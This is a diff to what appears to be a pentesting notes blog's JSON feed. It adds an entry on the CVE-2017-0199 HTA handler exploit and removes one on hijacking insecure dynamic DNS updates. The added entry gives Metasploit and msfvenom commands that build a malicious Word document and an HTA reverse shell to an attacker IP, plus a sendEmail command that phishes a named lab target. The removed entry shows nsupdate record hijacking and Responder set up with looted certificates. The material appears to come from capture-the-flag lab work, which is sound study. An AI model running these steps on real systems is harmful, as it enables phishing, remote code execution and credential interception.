@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/05/14/hta-handler-rce-cve20170199",
+            "title": "HTA Handler RCE (CVE-2017-0199)",
+            "summary": "HTA Handler RCE (CVE-2017-0199)",
+            "content_text": "Overview  Attacker sends document with OLE to victim  Victim clicks document (or download attachment from email)  Document sends GET request to attacker IP to download a malicious HTA file. Once this file is downloaded, victim machine executes it due to logic bug of mshta.exe.Exploits                              [CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler          Mandiant](https://www.mandiant.com/resources/cve-2017-0199-hta-handler) - using RTF and Word documnets                      CVE-2017-0199: New Malware Abuses PowerPoint SlidesTools  CVE-2017-0199 Python exploit toolkit  Metasploit# Generate document and run webservermsfconsole -x \"use windows/fileformat/office_word_hta; set srvhost tun0; set filename Procedures.doc; set lhost tun0; run\"# Send generated document to victim and wait for the reverse# connection in metasploitsendEmail -t nico@megabank.com -f hacker@kali.com -s reel:25 -u Procedures -o tls=no -a /home/kali/.msf4/local/Procedures.doc -m \"See attachment for procedures\"TroubleshootingThe python exploit in github didnt worked for me. When I tried to see in wireshark the network connections, I saw that victim did a GET request to attacker, but attacker didnt respond back. Probably there is something wrong on http server implemention?From other writeups, they didnt use the http server that comes up with the exploit kit but instead they used their own http server.Alternatives  You can generate HTA file via this methods# msfvenommsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f hta-psh -o msfv.hta# via nishanghttps://www.youtube.com/watch?v=ob9SgtFm6_g&amp;t=794sReferences  HTB Reel  CVE-2017-11826 Exploited in the Wild with Politically Themed RTF Document  - maybe also related as this is an RTF exploit",
+            "content_html": "<h2 id=\"overview\">Overview</h2><ol>  <li>Attacker sends document with OLE to victim</li>  <li>Victim clicks document (or download attachment from email)</li>  <li>Document sends GET request to attacker IP to download a malicious HTA file. Once this file is downloaded, victim machine executes it due to logic bug of <code class=\"language-plaintext highlighter-rouge\">mshta.exe</code>.</li></ol><h2 id=\"exploits\">Exploits</h2><ul>  <li>    <table>      <tbody>        <tr>          <td>[CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler</td>          <td>Mandiant](https://www.mandiant.com/resources/cve-2017-0199-hta-handler) - using RTF and Word documnets</td>        </tr>      </tbody>    </table>  </li>  <li><a href=\"https://www.trendmicro.com/en_sg/research/17/h/cve-2017-0199-new-malware-abuses-powerpoint-slide-show.html\">CVE-2017-0199: New Malware Abuses PowerPoint Slides</a></li></ul><h2 id=\"tools\">Tools</h2><ul>  <li><a href=\"https://github.com/bhdresh/CVE-2017-0199\">CVE-2017-0199 Python exploit toolkit</a></li></ul><p><img src=\"/spindel/assets/HTA%20Handler%20RCE%20(CVE-2017-0199)/Scenario1.jpg\" alt=\"\" /></p><ul>  <li>Metasploit</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Generate document and run webserver</span>msfconsole <span class=\"nt\">-x</span> <span class=\"s2\">\"use windows/fileformat/office_word_hta; set srvhost tun0; set filename Procedures.doc; set lhost tun0; run\"</span><span class=\"c\"># Send generated document to victim and wait for the reverse</span><span class=\"c\"># connection in metasploit</span>sendEmail <span class=\"nt\">-t</span> nico@megabank.com <span class=\"nt\">-f</span> hacker@kali.com <span class=\"nt\">-s</span> reel:25 <span class=\"nt\">-u</span> Procedures <span class=\"nt\">-o</span> <span class=\"nv\">tls</span><span class=\"o\">=</span>no <span class=\"nt\">-a</span> /home/kali/.msf4/local/Procedures.doc <span class=\"nt\">-m</span> <span class=\"s2\">\"See attachment for procedures\"</span></code></pre></div></div><h2 id=\"troubleshooting\">Troubleshooting</h2><p>The python exploit in github didnt worked for me. When I tried to see in wireshark the network connections, I saw that victim did a <code class=\"language-plaintext highlighter-rouge\">GET</code> request to attacker, but attacker didnt respond back. Probably there is something wrong on http server implemention?</p><p>From other writeups, they didnt use the http server that comes up with the exploit kit but instead they used their own http server.</p><h2 id=\"alternatives\">Alternatives</h2><ul>  <li>You can generate HTA file via this methods</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># msfvenom</span>msfvenom <span class=\"nt\">-p</span> windows/shell_reverse_tcp <span class=\"nv\">LHOST</span><span class=\"o\">=</span>10.10.14.3 <span class=\"nv\">LPORT</span><span class=\"o\">=</span>443 <span class=\"nt\">-f</span> hta-psh <span class=\"nt\">-o</span> msfv.hta<span class=\"c\"># via nishang</span>https://www.youtube.com/watch?v<span class=\"o\">=</span>ob9SgtFm6_g&amp;t<span class=\"o\">=</span>794s</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB Reel</li>  <li><a href=\"https://www.fortinet.com/blog/threat-research/cve-2017-11826-exploited-in-the-wild-with-politically-themed-rtf-document\">CVE-2017-11826 Exploited in the Wild with Politically Themed RTF Document</a>  - maybe also related as this is an RTF exploit</li></ul>",
+            "url": "https://mvineza.github.io/spindel/2022/05/14/hta-handler-rce-cve20170199",
+            
+            
+            
+            "tags": ["rce","windows","foothold"],
+            
+            "date_published": "2022-05-14T00:00:00+08:00",
+            "date_modified": "2022-05-14T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/05/08/redis-4-and-5-unauthenticated-rce",
             "title": "Redis 4 and 5 Unauthenticated RCE",
             "summary": "Redis 4 and 5 Unauthenticated RCE",
@@ -846,30 +870,6 @@
             
             "date_published": "2022-03-01T00:00:00+08:00",
             "date_modified": "2022-03-01T00:00:00+08:00",
-            
-                "author":  {
-                "name": "spindel",
-                "url": null,
-                "avatar": null
-                }
-                
-            
-        },
-    
-        {
-            "id": "https://mvineza.github.io/spindel/2022/02/27/insecure-dynamic-dns-updates",
-            "title": "Insecure Dynamic DNS Updates",
-            "summary": "Insecure Dynamic DNS Updates",
-            "content_text": "What is Dynamic DNS Updates?  Improves management of DNS records  For example, a new end device who receives an IP via DHCP can register itself by adding A record into the DNS  More info: Microsoft DocsVulnerabilityAn attacker can replace a record by its own IP which will force clients to connect to it.Steps  Delete record and replace with attacker IP 10.11.40.33➜ nsupdate&gt; server 10.10.23.72&gt; update delete selfservice.windcorp.thm &gt; send&gt; update add selfservice.windcorp.thm 1234 A 10.11.40.33&gt; send&gt; quit  Verify A record points to attacker IP➜  ra2 dig selfservice.windcorp.thm a @thm; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; selfservice.windcorp.thm a @thm;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 57355;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4000;; QUESTION SECTION:;selfservice.windcorp.thm.\tIN\tA;; ANSWER SECTION:selfservice.windcorp.thm. 1234\tIN\tA\t10.11.40.33;; Query time: 188 msec;; SERVER: 10.10.23.72#53(10.10.23.72);; WHEN: Sat Sep 18 08:00:02 EDT 2021;; MSG SIZE  rcvd: 69  If you have HTTPS certificates looted from victim, put it in respondersudo cp *pem /usr/share/responder/certs/  Point responder config to the certs➜  scans cat /etc/responder/Responder.conf| grep certSSLCert = certs/crt.pemSSLKey = certs/key.pem➜  scans   Fire up responder and wait for clients to connect to yousudo responder -I tun0",
-            "content_html": "<h2 id=\"what-is-dynamic-dns-updates\">What is Dynamic DNS Updates?</h2><ul>  <li>Improves management of DNS records</li>  <li>For example, a new end device who receives an IP via DHCP can register itself by adding A record into the DNS</li>  <li>More info: <a href=\"https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/configure-dns-dynamic-updates-windows-server-2003\">Microsoft Docs</a></li></ul><p><img src=\"/spindel/assets/Insecure%20Dynamic%20DNS%20Updates/secure-dns.png\" alt=\"\" /></p><h2 id=\"vulnerability\">Vulnerability</h2><p>An attacker can replace a record by its own IP which will force clients to connect to it.</p><h2 id=\"steps\">Steps</h2><ul>  <li>Delete record and replace with attacker IP <code class=\"language-plaintext highlighter-rouge\">10.11.40.33</code></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜ nsupdate<span class=\"o\">&gt;</span> server 10.10.23.72<span class=\"o\">&gt;</span> update delete selfservice.windcorp.thm <span class=\"o\">&gt;</span> send<span class=\"o\">&gt;</span> update add selfservice.windcorp.thm 1234 A 10.11.40.33<span class=\"o\">&gt;</span> send<span class=\"o\">&gt;</span> quit</code></pre></div></div><ul>  <li>Verify A record points to attacker IP</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  ra2 dig selfservice.windcorp.thm a @thm<span class=\"p\">;</span> &lt;&lt;<span class=\"o\">&gt;&gt;</span> DiG 9.16.15-Debian &lt;&lt;<span class=\"o\">&gt;&gt;</span> selfservice.windcorp.thm a @thm<span class=\"p\">;;</span> global options: +cmd<span class=\"p\">;;</span> Got answer:<span class=\"p\">;;</span> -&gt;&gt;HEADER<span class=\"o\">&lt;&lt;-</span> <span class=\"no\">opcode</span><span class=\"sh\">: QUERY, status: NOERROR, id: 57355;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4000;; QUESTION SECTION:;selfservice.windcorp.thm.\tIN\tA;; ANSWER SECTION:selfservice.windcorp.thm. 1234\tIN\tA\t10.11.40.33;; Query time: 188 msec;; SERVER: 10.10.23.72#53(10.10.23.72);; WHEN: Sat Sep 18 08:00:02 EDT 2021;; MSG SIZE  rcvd: 69</span></code></pre></div></div><ul>  <li>If you have HTTPS certificates looted from victim, put it in responder</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">sudo cp</span> <span class=\"k\">*</span>pem /usr/share/responder/certs/</code></pre></div></div><ul>  <li>Point responder config to the certs</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  scans <span class=\"nb\">cat</span> /etc/responder/Responder.conf| <span class=\"nb\">grep </span>certSSLCert <span class=\"o\">=</span> certs/crt.pemSSLKey <span class=\"o\">=</span> certs/key.pem➜  scans </code></pre></div></div><ul>  <li>Fire up responder and wait for clients to connect to you</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">sudo </span>responder <span class=\"nt\">-I</span> tun0</code></pre></div></div>",
-            "url": "https://mvineza.github.io/spindel/2022/02/27/insecure-dynamic-dns-updates",
-            
-            
-            
-            "tags": ["dns","windows","foothold"],
-            
-            "date_published": "2022-02-27T00:00:00+08:00",
-            "date_modified": "2022-02-27T00:00:00+08:00",
             
                 "author":  {
                 "name": "spindel",
